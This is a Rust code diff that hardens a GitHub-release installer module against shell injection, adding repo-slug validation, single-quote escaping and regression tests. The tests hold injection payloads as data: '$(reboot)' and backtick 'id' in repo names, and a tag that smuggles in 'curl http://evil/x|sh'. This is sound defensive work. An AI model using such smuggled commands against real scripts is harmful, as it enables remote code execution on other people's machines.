@@ -18,7 +18,20 @@
 //!   install_dir: /home/user/.cargo/bin
 //! ```
 
+use crate::core::shell_escape::{is_valid_repo, sh_squote};
 use crate::core::types::Resource;
+
+/// Error script emitted when `repo` is not a valid `owner/repo` slug.
+///
+/// FJ-154: `repo` flows into a URL, status labels and a binary path. Rejecting
+/// anything outside `^[A-Za-z0-9._-]+/[A-Za-z0-9._-]+$` keeps every later
+/// interpolation safe without per-site escaping of the (now-constrained) repo.
+fn reject_bad_repo(repo: &str) -> String {
+    format!(
+        "echo {} >&2; exit 1",
+        sh_squote(&format!("ERROR: invalid github repo slug: {repo}"))
+    )
+}
 
 /// Generate shell script to check if the binary from a GitHub release is installed.
 ///
@@ -27,13 +40,16 @@ use crate::core::types::Resource;
 /// 2. Binary is executable
 pub fn check_script(resource: &Resource) -> String {
     let repo = resource.repo.as_deref().unwrap_or("unknown/unknown");
+    if !is_valid_repo(repo) {
+        return reject_bad_repo(repo);
+    }
     let binary = resource.binary.as_deref().unwrap_or("unknown");
     let install_dir = resource.install_dir.as_deref().unwrap_or("/usr/local/bin");
-    let bin_path = format!("{install_dir}/{binary}");
+    let bin_path = sh_squote(&format!("{install_dir}/{binary}"));
 
     format!(
-        "if [ -x '{bin_path}' ]; then\n\
-         \x20 VER=$( '{bin_path}' --version 2>/dev/null | head -1 || echo 'unknown' )\n\
+        "if [ -x {bin_path} ]; then\n\
+         \x20 VER=$( {bin_path} --version 2>/dev/null | head -1 || echo 'unknown' )\n\
          \x20 echo \"installed:{repo}:$VER\"\n\
          else\n\
          \x20 echo 'missing:{repo}'\n\
@@ -48,19 +64,35 @@ pub fn check_script(resource: &Resource) -> String {
 /// without `gh`.
 pub fn apply_script(resource: &Resource) -> String {
     let repo = resource.repo.as_deref().unwrap_or("unknown/unknown");
+    if !is_valid_repo(repo) {
+        return reject_bad_repo(repo);
+    }
     let tag = resource.tag.as_deref().unwrap_or("latest");
     let asset_pattern = resource.asset_pattern.as_deref().unwrap_or("*");
     // Strip glob wildcards for use in grep -F (fixed string match)
-    let grep_pattern = asset_pattern.trim_matches('*');
+    let grep_pattern = sh_squote(asset_pattern.trim_matches('*'));
     let binary = resource.binary.as_deref().unwrap_or("unknown");
+    let binary_q = sh_squote(binary);
     let install_dir = resource.install_dir.as_deref().unwrap_or("/usr/local/bin");
+    let install_dir_q = sh_squote(install_dir);
     let state = resource.state.as_deref().unwrap_or("present");
-    let bin_path = format!("{install_dir}/{binary}");
+    let bin_path = sh_squote(&format!("{install_dir}/{binary}"));
+    // FJ-154: build the API URL in Rust, then deliver it via a single-quoted
+    // assignment so `tag` (a free-form value) cannot inject command
+    // substitution into the double-quoted string it used to sit in.
+    let release_url = sh_squote(&format!(
+        "https://api.github.com/repos/{repo}/releases/tags/{tag}"
+    ));
+    let no_asset_msg = sh_squote(&format!(
+        "ERROR: no asset matching {asset_pattern} in {repo}@{tag}"
+    ));
+    // `$TMPDIR/<binary>` for tar/find: keep `$TMPDIR` live, append a quoted binary.
+    let tmp_bin = format!("\"$TMPDIR/\"{binary_q}");
 
     match state {
         "absent" => format!(
             "set -euo pipefail\n\
-             rm -f '{bin_path}'\n\
+             rm -f {bin_path}\n\
              echo 'removed:{repo}'"
         ),
         _ => format!(
@@ -69,15 +101,15 @@ pub fn apply_script(resource: &Resource) -> String {
              trap 'rm -rf \"$TMPDIR\"' EXIT\n\
              \n\
              # Download release asset via GitHub API (no gh CLI required)\n\
-             RELEASE_URL=\"https://api.github.com/repos/{repo}/releases/tags/{tag}\"\n\
+             RELEASE_URL={release_url}\n\
              DOWNLOAD_URL=$(curl -fsSL \"$RELEASE_URL\" | \\\n\
-             \x20 grep -F '{grep_pattern}' | \\\n\
+             \x20 grep -F {grep_pattern} | \\\n\
              \x20 grep -o '\"browser_download_url\": *\"[^\"]*\"' | \\\n\
              \x20 head -1 | \\\n\
              \x20 grep -o 'https://[^\"]*')\n\
              \n\
              if [ -z \"$DOWNLOAD_URL\" ]; then\n\
-             \x20 echo \"ERROR: no asset matching '{asset_pattern}' in {repo}@{tag}\" >&2\n\
+             \x20 echo {no_asset_msg} >&2\n\
              \x20 exit 1\n\
              fi\n\
              \n\
@@ -88,15 +120,15 @@ pub fn apply_script(resource: &Resource) -> String {
              \x20 *.tar.gz|*.tgz)\n\
              \x20\x20\x20 tar xzf \"$ASSET\" -C \"$TMPDIR\" --strip-components=0\n\
              \x20\x20\x20 # Find the binary in extracted files\n\
-             \x20\x20\x20 if [ -f \"$TMPDIR/{binary}\" ]; then\n\
-             \x20\x20\x20\x20\x20 EXTRACTED=\"$TMPDIR/{binary}\"\n\
+             \x20\x20\x20 if [ -f {tmp_bin} ]; then\n\
+             \x20\x20\x20\x20\x20 EXTRACTED={tmp_bin}\n\
              \x20\x20\x20 else\n\
-             \x20\x20\x20\x20\x20 EXTRACTED=$(find \"$TMPDIR\" -name '{binary}' -type f | head -1)\n\
+             \x20\x20\x20\x20\x20 EXTRACTED=$(find \"$TMPDIR\" -name {binary_q} -type f | head -1)\n\
              \x20\x20\x20 fi\n\
              \x20\x20\x20 ;;\n\
              \x20 *.zip)\n\
              \x20\x20\x20 unzip -o \"$ASSET\" -d \"$TMPDIR\"\n\
-             \x20\x20\x20 EXTRACTED=$(find \"$TMPDIR\" -name '{binary}' -type f | head -1)\n\
+             \x20\x20\x20 EXTRACTED=$(find \"$TMPDIR\" -name {binary_q} -type f | head -1)\n\
              \x20\x20\x20 ;;\n\
              \x20 *)\n\
              \x20\x20\x20 EXTRACTED=\"$ASSET\"\n\
@@ -104,19 +136,20 @@ pub fn apply_script(resource: &Resource) -> String {
              esac\n\
              \n\
              if [ -z \"$EXTRACTED\" ] || [ ! -f \"$EXTRACTED\" ]; then\n\
-             \x20 echo \"ERROR: binary '{binary}' not found in release asset\" >&2\n\
+             \x20 echo {} >&2\n\
              \x20 exit 1\n\
              fi\n\
              \n\
              # Install (realpath validates path before cp)\n\
              SAFE_BIN=$(realpath \"$EXTRACTED\")\n\
-             mkdir -p '{install_dir}'\n\
-             cp \"$SAFE_BIN\" '{bin_path}'\n\
-             chmod +x '{bin_path}'\n\
+             mkdir -p {install_dir_q}\n\
+             cp \"$SAFE_BIN\" {bin_path}\n\
+             chmod +x {bin_path}\n\
              \n\
              # Verify\n\
-             VER=$( '{bin_path}' --version 2>/dev/null | head -1 || echo 'installed' )\n\
-             echo \"installed:{repo}:$VER\""
+             VER=$( {bin_path} --version 2>/dev/null | head -1 || echo 'installed' )\n\
+             echo \"installed:{repo}:$VER\"",
+            sh_squote(&format!("ERROR: binary {binary} not found in release asset"))
         ),
     }
 }
@@ -128,14 +161,17 @@ pub fn apply_script(resource: &Resource) -> String {
 /// changes and drift is detected.
 pub fn state_query_script(resource: &Resource) -> String {
     let repo = resource.repo.as_deref().unwrap_or("unknown/unknown");
+    if !is_valid_repo(repo) {
+        return reject_bad_repo(repo);
+    }
     let binary = resource.binary.as_deref().unwrap_or("unknown");
     let install_dir = resource.install_dir.as_deref().unwrap_or("/usr/local/bin");
-    let bin_path = format!("{install_dir}/{binary}");
+    let bin_path = sh_squote(&format!("{install_dir}/{binary}"));
 
     format!(
-        "if [ -x '{bin_path}' ]; then\n\
-         \x20 VER=$( '{bin_path}' --version 2>/dev/null | head -1 || echo 'unknown' )\n\
-         \x20 SIZE=$(stat -c%s '{bin_path}' 2>/dev/null || stat -f%z '{bin_path}' 2>/dev/null || echo '0')\n\
+        "if [ -x {bin_path} ]; then\n\
+         \x20 VER=$( {bin_path} --version 2>/dev/null | head -1 || echo 'unknown' )\n\
+         \x20 SIZE=$(stat -c%s {bin_path} 2>/dev/null || stat -f%z {bin_path} 2>/dev/null || echo '0')\n\
          \x20 echo \"github_release={repo}:$VER:$SIZE\"\n\
          else\n\
          \x20 echo 'github_release=MISSING:{repo}'\n\
@@ -246,7 +282,7 @@ mod tests {
     fn test_fj034_binary_not_found_error() {
         let r = make_github_release_resource("paiml/forjar", "forjar");
         let script = apply_script(&r);
-        assert!(script.contains("binary 'forjar' not found in release asset"));
+        assert!(script.contains("binary forjar not found in release asset"));
         assert!(script.contains("exit 1"));
     }
 
@@ -262,5 +298,57 @@ mod tests {
         let r = make_github_release_resource("paiml/forjar", "forjar");
         let script = state_query_script(&r);
         assert!(script.contains("stat -c%s") || script.contains("stat"));
+    }
+
+    // ── FJ-154: shell-injection hardening ─────────────────────────
+
+    /// Defect #12: command substitution in `repo` is rejected before it can
+    /// reach the API URL assignment.
+    #[test]
+    fn fj154_repo_command_substitution_rejected() {
+        let r = make_github_release_resource("x/y$(reboot)", "apr");
+        let script = apply_script(&r);
+        assert!(
+            script.contains("ERROR: invalid github repo slug"),
+            "{script}"
+        );
+        assert!(script.contains("exit 1"), "{script}");
+        assert!(!script.contains("repos/x/y$(reboot)"), "{script}");
+    }
+
+    /// A malicious tag is delivered inside a single-quoted assignment, so the
+    /// command substitution stays literal text.
+    #[test]
+    fn fj154_tag_injection_neutralized() {
+        let mut r = make_github_release_resource("paiml/aprender", "apr");
+        r.tag = Some("latest\";curl http://evil/x|sh;\"".to_string());
+        let script = apply_script(&r);
+        // The whole URL (incl. the payload) is one single-quoted word.
+        assert!(
+            script.contains("RELEASE_URL='https://api.github.com/repos/paiml/aprender/releases/tags/latest\";curl http://evil/x|sh;\"'"),
+            "{script}"
+        );
+        // The double-quoted RELEASE_URL form (where the payload was live) is gone.
+        assert!(!script.contains("RELEASE_URL=\"https://"), "{script}");
+    }
+
+    /// Repos with `$(...)` are rejected by check_script and state_query too.
+    #[test]
+    fn fj154_repo_rejected_in_all_phases() {
+        let r = make_github_release_resource("a/b`id`", "x");
+        assert!(check_script(&r).contains("ERROR: invalid github repo slug"));
+        assert!(state_query_script(&r).contains("ERROR: invalid github repo slug"));
+    }
+
+    /// Benign repo/tag still produce the expected URL substring.
+    #[test]
+    fn fj154_benign_repo_unchanged() {
+        let r = make_github_release_resource("paiml/aprender", "apr");
+        let script = apply_script(&r);
+        assert!(
+            script.contains("paiml/aprender/releases/tags/nightly"),
+            "{script}"
+        );
+        assert!(script.contains("/home/user/.cargo/bin/apr"), "{script}");
     }
 }
